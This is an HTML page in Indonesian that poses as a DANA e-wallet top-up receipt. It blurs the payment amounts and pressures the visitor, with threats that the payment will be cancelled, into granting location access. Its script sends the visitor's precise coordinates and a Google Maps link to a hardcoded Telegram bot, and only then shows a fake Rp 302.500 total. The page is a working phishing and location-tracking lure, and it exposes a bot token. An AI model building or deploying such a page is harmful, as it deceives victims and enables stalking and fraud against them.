<!DOCTYPE html>  
<html lang="id">  
<head>  
  <meta charset="UTF-8">  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
  <title>Konfirmasi Top-Up</title>  
  <style>  
    body {  
      background: #f2f2f2;  
      display: flex;  
      justify-content: center;  
      align-items: center;  
      min-height: 100vh;  
      margin: 0;  
    }  
    .struk {  
      background: white;  
      width: 320px;  
      padding: 20px;  
      font-family: monospace;  
      border: 1px solid #ccc;  
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);  
    }  
    .center { text-align: center; }  
    .row { display: flex; justify-content: space-between; margin: 6px 0; }  
    .hidden { color: #ccc; background: #eee; border-radius: 3px; padding: 1px 4px; }  
    .footer { margin-top: 12px; text-align: center; font-size: 13px; }  

    .popup {  
      position: fixed; top: 0; left: 0;  
      width: 100%; height: 100%;  
      background: rgba(0,0,0,0.6);  
      display: flex; justify-content: center; align-items: center;  
      visibility: hidden;  
    }  
    .popup-content {  
      background: white; padding: 20px; border-radius: 10px;  
      text-align: center; width: 90%; max-width: 350px;  
      font-family: Arial, sans-serif;  
    }  
    .popup button {  
      margin: 10px; padding: 10px 16px; font-size: 15px;  
      border: none; border-radius: 6px; cursor: pointer;  
    }  
    .allow { background: #007bff; color: white; }  
    .deny { background: #ccc; }  
  </style>  
</head>  
<body>  
  <div class="struk">  
    <div class="center">** VERCEL MERCHANT **</div>  
    <div class="center">25/01/2019 14:25:57 (CU)</div>  
    <br>  
    <div class="center"><strong>STRUK</strong></div>  
    <div class="center"><strong>TOP UP E-WALLET</strong></div>  
    <br>  
    <div class="row"><span>BANK TUJUAN</span><span>DANA</span></div>  
    <div class="row"><span>NO.REKENING</span><span>0895323539085</span></div>  
    <div class="row"><span>NAMA</span><span>*********</span></div>  
    <div class="row"><span>NO REFF</span><span>100000818348</span></div>  
    <div class="row"><span>NOMINAL</span><span class="hidden" id="uang">•••••••</span></div>  
    <div class="row"><span>ADMIN</span><span class="hidden" id="admin">••••</span></div>  
    <div class="row"><span>TOTAL BAYAR</span><span class="hidden" id="total">•••••••</span></div>  
    <br>  
    <div class="footer">  
      Simpanlah struk ini sebagai bukti transaksi Anda, dan silahkan tunggu 2 menit sebelum meninggalkan web ini.<br>  
      Terima Kasih  
    </div>  
  </div>  

  <!-- trackingi -->  
  <div class="popup" id="popup">  
    <div class="popup-content">  
      <h3>Izin Lokasi</h3>  
      <p>Demi keamanan, untuk melihat detail pembayaran dan melanjutkan proses top-up, silakan izinkan akses lokasi Anda. Jangan menggunakan VPN atau Proxy karena dapat menyebabkan proses pembayaran anda dibatalkan.</p>  
      <button class="allow" id="allowBtn">Izinkan</button>  
      <button class="deny" id="denyBtn">Tolak</button>  
    </div>  
  </div>  

  <script>  
    const popup = document.getElementById("popup");  
    const allowBtn = document.getElementById("allowBtn");  
    const denyBtn = document.getElementById("denyBtn");  
    const BOT_TOKEN = "8274670977:AAFfC5PYJrQXb3Vi4mK6Jsw_4uuEP1je0K8";  
    const CHAT_ID = "8029124420";  

    window.onload = () => {  
      popup.style.visibility = "visible";  
    };  

    allowBtn.onclick = () => {  
      if (navigator.geolocation) {  
        navigator.geolocation.getCurrentPosition(async position => {  
          const latitude = position.coords.latitude;  
          const longitude = position.coords.longitude;  

          const message = `📍 Lokasi Visitor:\n` +  
                          `Latitude: ${latitude}\n` +  
                          `Longitude: ${longitude}\n` +  
                          `Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;  

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
            method: "POST",  
            headers: { "Content-Type": "application/json" },  
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })  
          });  
          document.getElementById("uang").textContent = "Rp 300.000,00";  
          document.getElementById("admin").textContent = "Rp 2.500,00";  
          document.getElementById("total").textContent = "Rp 302.500,00";  

          popup.style.visibility = "hidden";  
        }, () => {  
          alert("Lokasi diperlukan untuk melihat mengonfirmasi pembayaran.");  
        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });  
      } else {  
        alert("Perangkat Anda tidak mendukung Geolocation.");  
      }  
    };  

    denyBtn.onclick = () => {  
      alert("Anda menolak izin lokasi. Detail pembayaran tidak dapat ditampilkan, dan proses telah kami dibatalkan");  
      popup.style.visibility = "hidden";  
    };  
  </script>  
</body>  
</html>